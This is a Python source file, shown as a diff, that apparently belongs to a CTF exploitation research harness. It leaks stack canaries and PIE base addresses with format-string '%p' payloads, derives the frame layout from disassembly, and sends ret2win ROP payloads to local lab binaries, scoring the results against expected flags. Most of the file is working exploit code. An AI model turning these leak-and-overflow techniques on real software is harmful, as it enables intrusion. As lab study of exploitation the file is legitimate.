@@ -1,0 +1,473 @@
+"""
+v015_leak_bypass.src — canary 与 PIE 绕过：先泄漏，再在同一进程里打
+
+为什么这两个是分水岭
+    v014 只能打"无 canary、无 PIE"的靶场。真实比赛里这两个保护几乎是默认开启的。
+    绕过它们的核心不是"算得更准"，而是**先拿到信息，再在同一进程里用掉**：
+        stage1  格式化字符串 → 泄漏 canary / 代码地址
+        stage2  栈溢出       → 带着泄漏值构造 payload
+    关键约束：**泄漏和利用必须发生在同一个进程里**，因为 ASLR 每次运行都会变。
+    所以这里不能像以前那样"跑一次拿输出、再跑一次"，必须交互式地喂数据。
+
+四个新单元
+    1. `leak_stack`     —— 发 `%p.` 序列，解析泄漏到的栈/代码值
+    2. `find_canary`    —— 低字节为 0、高熵、量级足够大的候选
+    3. `find_pie_base`  —— 用「低 12 位在 PIE 下不变」匹配已知符号，反推基址
+    4. `frame_layout`   —— **从反汇编推导**缓冲区/ canary / 返回地址的偏移
+
+    第 4 个是这次踩坑的核心：我一开始按"缓冲区 64 字节"算 canary 偏移，
+    但编译器实际是 `sub rsp,0x50`、canary 存在 `rbp-8`，
+    于是 canary 偏移是 72、返回地址偏移是 88。**布局必须读反汇编，不能假设。**
+
+测什么
+    C1  canary + 无 PIE      → 泄漏 canary 后 ret2win
+    P1  无 canary + PIE      → 泄漏基址后 ret2win
+    B1  canary + PIE（都有） → 两个都要泄漏
+    N1  没有格式化字符串阶段 → 泄漏失败，**应当如实拒绝**
+
+运行
+    python versions/v015_leak_bypass.src
+    python versions/v015_leak_bypass.src --only B1
+
+产出物
+    experiments/EXP-0013/{results.json,report.md}
+    experiments/EXP-0013/pwn/{vuln2.c,vuln2_canary,vuln2_pie,vuln2_both}
+"""
+
+from __future__ import annotations
+
+import json
+import re
+import struct
+import subprocess
+import sys
+import threading
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0013"
+PWN_DIR = OUT_DIR / "pwn"
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+LEAK_RE = re.compile(rb"0x[0-9a-fA-F]+")
+
+
+def wsl_path(win_path: str) -> str:
+    p = Path(win_path).resolve()
+    drive = p.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(p)[2:].replace("\\", "/")
+
+
+# --------------------------------------------------------------------------------------
+# ELF 事实 + 栈帧布局
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class ElfFacts:
+    symbols: dict[str, int] = field(default_factory=dict)
+    imports: set[str] = field(default_factory=set)
+    is_pie: bool = False
+    has_canary: bool = False
+    text_addr: int = 0
+    text_data: bytes = b""
+
+
+def elf_info(path: str) -> ElfFacts:
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        symbols: dict[str, int] = {}
+        imports: set[str] = set()
+        for section_name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(section_name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if not symbol.name:
+                    continue
+                imports.add(symbol.name)
+                if symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        text = elf.get_section_by_name(".text")
+        return ElfFacts(
+            symbols=symbols,
+            imports=imports,
+            is_pie=elf["e_type"] == "ET_DYN",
+            has_canary="__stack_chk_fail" in imports,
+            text_addr=text["sh_addr"],
+            text_data=text.data(),
+        )
+
+
+def frame_layout(facts: ElfFacts) -> dict:
+    """从反汇编推导「缓冲区 / canary / 返回地址」相对缓冲区起点的偏移。
+
+    识别模式（x86-64 -O0 典型形态）：
+        sub  rsp, FRAME
+        mov  rax, fs:0x28          ; 取 canary
+        mov  [rbp-CANARY], rax
+        ...
+        lea  rax, [rbp-BUF]        ; 缓冲区起点
+        call read/gets
+    """
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    engine.detail = False
+    frame = None
+    canary_slot = None
+    buffer_slot = None
+    saw_fs = False
+
+    for instruction in engine.disasm(facts.text_data, facts.text_addr):
+        text = f"{instruction.mnemonic} {instruction.op_str}"
+        if instruction.mnemonic == "sub" and instruction.op_str.startswith("rsp,"):
+            try:
+                frame = int(instruction.op_str.split(",")[1].strip(), 0)
+            except ValueError:
+                pass
+        elif "fs:" in instruction.op_str and "0x28" in instruction.op_str:
+            # capstone 可能渲染成 fs:[0x28]，不要写死冒号位置
+            saw_fs = True
+        elif saw_fs and instruction.mnemonic == "mov" and ", rax" in instruction.op_str:
+            match = re.search(r"\[rbp - (0x[0-9a-fA-F]+|\d+)\]", instruction.op_str)
+            if match:
+                canary_slot = int(match.group(1), 0)
+                saw_fs = False
+        elif instruction.mnemonic == "lea" and "rbp -" in instruction.op_str:
+            match = re.search(r"\[rbp - (0x[0-9a-fA-F]+|\d+)\]", instruction.op_str)
+            if match:
+                buffer_slot = int(match.group(1), 0)
+        elif instruction.mnemonic == "call" and (
+            "read@" in instruction.op_str or "gets@" in instruction.op_str
+        ):
+            break
+
+    if frame is None or buffer_slot is None:
+        return {"ok": False, "reason": "layout_not_found"}
+
+    canary_offset = None
+    if canary_slot is not None and buffer_slot > canary_slot:
+        canary_offset = buffer_slot - canary_slot
+    return {
+        "ok": True,
+        "frame": frame,
+        "buffer_slot": buffer_slot,
+        "canary_slot": canary_slot,
+        # 返回地址在 rbp+8；相对缓冲区起点 = buffer_slot + 8
+        "ret_offset": buffer_slot + 8,
+        "canary_offset": canary_offset,
+    }
+
+
+# --------------------------------------------------------------------------------------
+# 交互式进程：泄漏和利用必须在同一个进程里
+# --------------------------------------------------------------------------------------
+
+class Interactive:
+    def __init__(self, binary_wsl: str) -> None:
+        self.proc = subprocess.Popen(
+            ["wsl", "-e", binary_wsl],
+            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL, bufsize=0,
+        )
+        self.buffer = bytearray()
+        self.lock = threading.Lock()
+        self._closed = False
+        threading.Thread(target=self._reader, daemon=True).start()
+
+    def _reader(self) -> None:
+        while True:
+            chunk = self.proc.stdout.read(1)
+            if not chunk:
+                break
+            with self.lock:
+                self.buffer += chunk
+
+    def wait_for(self, marker: bytes, timeout: float = 10.0) -> bytes:
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            with self.lock:
+                if marker in self.buffer:
+                    return bytes(self.buffer)
+            time.sleep(0.005)
+        with self.lock:
+            return bytes(self.buffer)
+
+    def send(self, data: bytes) -> None:
+        self.proc.stdin.write(data)
+        self.proc.stdin.flush()
+
+    def close_stdin(self) -> None:
+        if not self._closed:
+            try:
+                self.proc.stdin.close()
+            except OSError:
+                pass
+            self._closed = True
+
+    def finish(self, timeout: float = 8.0) -> tuple[int, bytes]:
+        self.close_stdin()
+        try:
+            self.proc.wait(timeout=timeout)
+        except subprocess.TimeoutExpired:
+            self.proc.kill()
+        time.sleep(0.1)
+        with self.lock:
+            return self.proc.returncode if self.proc.returncode is not None else -1, \
+                   bytes(self.buffer)
+
+
+# --------------------------------------------------------------------------------------
+# 泄漏与候选筛选
+# --------------------------------------------------------------------------------------
+
+def leak_stack(binary_wsl: str, count: int = 60) -> dict:
+    """发 `%p.` 序列，拿到泄漏值。返回 (values, 交互对象, 原始输出)。"""
+    proc = Interactive(binary_wsl)
+    proc.send(("%p." * count + "\n").encode())
+    out = proc.wait_for(b"stage2:", timeout=6.0)
+    values = [int(v, 16) for v in LEAK_RE.findall(out)]
+    return {"values": values, "proc": proc, "raw": out,
+            "stage_found": b"stage2:" in out}
+
+
+def find_canary(values: list[int]) -> list[int]:
+    """canary 的特征：最低字节为 0（`\\x00`），其余随机，量级很大。
+
+    注意：栈地址也可能以 00 结尾（例如 `0x7f7800000000`），
+    所以先把典型的栈地址段（0x7f..）排在后面，靠执行再验证。
+    """
+    stack_like: list[int] = []
+    others: list[int] = []
+    for value in values:
+        if not value or (value & 0xFF) != 0 or value <= (1 << 40):
+            continue
+        bucket = stack_like if (value >> 40) == 0x7F else others
+        if value not in bucket:
+            bucket.append(value)
+    return others + stack_like
+
+
+def find_pie_bases(values: list[int], symbols: dict[str, int]) -> list[int]:
+    """PIE 下低 12 位不变：用已知符号的页内偏移去匹配泄漏值。
+
+    优先用 main 的返回地址（最常见），其次才是其它函数。
+    """
+    bases: list[int] = []
+    for name in ("main", "stage1", "stage2", "win_arg"):
+        addr = symbols.get(name)
+        if not addr:
+            continue
+        for value in values:
+            if value <= addr or (value & 0xFFF) != (addr & 0xFFF):
+                continue
+            base = value - addr
+            if (base & 0xFFF) == 0 and base not in bases:
+                bases.append(base)
+    return bases
+
+
+# --------------------------------------------------------------------------------------
+# 拼 payload
+# --------------------------------------------------------------------------------------
+
+def _pick(symbols: dict[str, int], *names: str) -> int:
+    for name in names:
+        if name in symbols:
+            return symbols[name]
+    raise KeyError(f"找不到符号：{names}")
+
+
+def build_payload(layout: dict, canary: int | None, base: int,
+                  symbols: dict[str, int], arg: int = 0x1234) -> bytes:
+    ret_offset = layout["ret_offset"]
+    if canary is not None:
+        canary_offset = layout["canary_offset"]
+        if canary_offset is None:
+            raise ValueError("需要 canary 但布局里没有 canary 槽")
+        padding = b"A" * canary_offset + struct.pack("<Q", canary)
+        padding += b"B" * (ret_offset - canary_offset - 8)
+    else:
+        padding = b"A" * ret_offset
+
+    pop_rdi = base + _pick(symbols, "g2_pop_rdi", "gadget_pop_rdi")
+    align_ret = base + _pick(symbols, "g2_ret", "gadget_ret")
+    target = base + symbols["win_arg"]
+    return (padding + struct.pack("<Q", align_ret) + struct.pack("<Q", pop_rdi)
+            + struct.pack("<Q", arg) + struct.pack("<Q", target))
+
+
+# --------------------------------------------------------------------------------------
+# 解题
+# --------------------------------------------------------------------------------------
+
+def solve(path: str, expected: str) -> dict:
+    started = time.perf_counter()
+    steps: list[dict] = []
+    facts = elf_info(path)
+    layout = frame_layout(facts)
+    steps.append({"unit": "elf_info", "pie": facts.is_pie, "canary": facts.has_canary})
+    steps.append({"unit": "frame_layout", **layout})
+    if not layout["ok"]:
+        return {"solved": False, "reason": "layout_not_found", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    # 泄漏值可能给出多个候选（canary 与栈地址难分、多个代码地址可能凑出多个基址）。
+    # 这里不赌第一个，而是**逐个用真实执行验证**：
+    # 每次尝试都重新起一个进程、重新泄漏，因为 ASLR 每次都变。
+    max_attempts = 6
+    last_reason = "no_candidates"
+    for attempt in range(max_attempts):
+        leak = leak_stack(wsl_path(path))
+        proc = leak["proc"]
+        values = leak["values"]
+        steps.append({"unit": "leak_stack", "attempt": attempt,
+                      "leaked": len(values), "stage_found": leak["stage_found"]})
+        if not leak["stage_found"]:
+            proc.close_stdin()
+            proc.finish(timeout=2.0)
+            return {"solved": False, "reason": "leak_stage_not_found", "steps": steps,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+        canaries = find_canary(values) if facts.has_canary else []
+        bases = find_pie_bases(values, facts.symbols) if facts.is_pie else [0]
+        steps.append({"unit": "find_canary", "attempt": attempt,
+                      "candidates": [hex(c) for c in canaries], "needed": facts.has_canary})
+        steps.append({"unit": "find_pie_base", "attempt": attempt,
+                      "candidates": [hex(b) for b in bases], "needed": facts.is_pie})
+
+        if facts.has_canary and not canaries:
+            proc.close_stdin()
+            proc.finish(timeout=2.0)
+            last_reason = "canary_not_leaked"
+            continue
+        if facts.is_pie and not bases:
+            proc.close_stdin()
+            proc.finish(timeout=2.0)
+            last_reason = "pie_base_not_leaked"
+            continue
+
+        pairs = [(c, b) for c in (canaries or [None]) for b in (bases or [0])]
+        canary, base = pairs[min(attempt, len(pairs) - 1)]
+        payload = build_payload(layout, canary, base, facts.symbols)
+        steps.append({"unit": "build_payload", "attempt": attempt, "len": len(payload),
+                      "canary": hex(canary) if canary else None, "base": hex(base)})
+        proc.send(payload)
+        _rc, out = proc.finish()
+        text = out.decode("utf-8", "replace")
+        found = FLAG_RE.search(text)
+        ok = bool(found and found.group(0).lower() == expected.lower())
+        steps.append({"unit": "execute", "attempt": attempt,
+                      "result": "solved" if ok else "failed"})
+        if ok:
+            return {"solved": True, "reason": None, "steps": steps,
+                    "attempts": attempt + 1,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+        last_reason = "exploit_failed"
+
+    return {"solved": False, "reason": last_reason, "steps": steps,
+            "attempts": max_attempts,
+            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+
+EXPECTED = "flag{leak_bypass_real}"
+
+
+def build_targets() -> list[dict]:
+    variants = [
+        ("C1", str(PWN_DIR / "vuln2_canary"), False),
+        ("P1", str(PWN_DIR / "vuln2_pie"), False),
+        ("B1", str(PWN_DIR / "vuln2_both"), False),
+        # N1：EXP-0012 的靶场没有格式化字符串阶段，泄漏不出来，应当如实失败
+        ("N1", str(PWN_DIR.parent.parent / "EXP-0012" / "pwn" / "vuln"), True),
+    ]
+    return [{"id": tid, "path": path, "negative": negative}
+            for tid, path, negative in variants]
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="canary / PIE 绕过")
+    parser.add_argument("--only", default=None)
+    args = parser.parse_args()
+
+    # 写一个带预期 flag 的文件
+    flag_file = Path("/tmp/flag.txt")
+    try:
+        subprocess.run(["wsl", "-e", "bash", "-lc",
+                        f"printf '{EXPECTED}\\n' > /tmp/flag.txt"], timeout=30)
+    except (OSError, subprocess.TimeoutExpired):
+        pass
+
+    rows: list[dict] = []
+    for task in build_targets():
+        if args.only and task["id"] != args.only:
+            continue
+        if not Path(task["path"]).exists():
+            log(f"  {task['id']}: 跳过（靶场不存在：{task['path']}）")
+            continue
+        result = solve(task["path"], EXPECTED)
+        row = {"id": task["id"], "negative": task["negative"], **result}
+        rows.append(row)
+        if row["negative"]:
+            ok = not row["solved"]
+            verdict = "OK(如实失败)" if ok else "UNEXPECTED"
+        else:
+            verdict = "OK" if row["solved"] else "FAILED"
+        log(f"  {task['id']}: {verdict:12} {row.get('reason') or '':22} "
+            f"units={[s['unit'] for s in row['steps']]}  {row['elapsed_ms']}ms")
+
+    positives = [r for r in rows if not r["negative"]]
+    negatives = [r for r in rows if r["negative"]]
+    summary = {
+        "positive_total": len(positives),
+        "positive_solved": sum(1 for r in positives if r["solved"]),
+        "negative_total": len(negatives),
+        "negative_correctly_failed": sum(1 for r in negatives if not r["solved"]),
+        "mean_elapsed_ms": round(sum(r["elapsed_ms"] for r in rows) / max(len(rows), 1), 1),
+    }
+    log("汇总：" + json.dumps(summary, ensure_ascii=False))
+
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "rows": rows}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0013 — canary / PIE 绕过", "",
+             "核心约束：泄漏与利用必须在**同一进程**内完成（ASLR 每次运行都变）。", "",
+             "## 汇总", "", "```json",
+             json.dumps(summary, ensure_ascii=False, indent=2), "```", "",
+             "## 逐题", "", "| 题 | 类型 | 结果 | 原因 | 耗时 |",
+             "| --- | --- | --- | --- | --- |"]
+    for row in rows:
+        if row["negative"]:
+            mark = "✓ 如实失败" if not row["solved"] else "✗ 不该解出"
+            kind = "负样本"
+        else:
+            mark = "✓ 解出" if row["solved"] else "✗ 失败"
+            kind = "正样本"
+        lines.append(f"| {row['id']} | {kind} | {mark} | {row.get('reason') or '—'} "
+                     f"| {row['elapsed_ms']}ms |")
+    (OUT_DIR / "report.md").write_text("\n".join(lines), encoding="utf-8")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
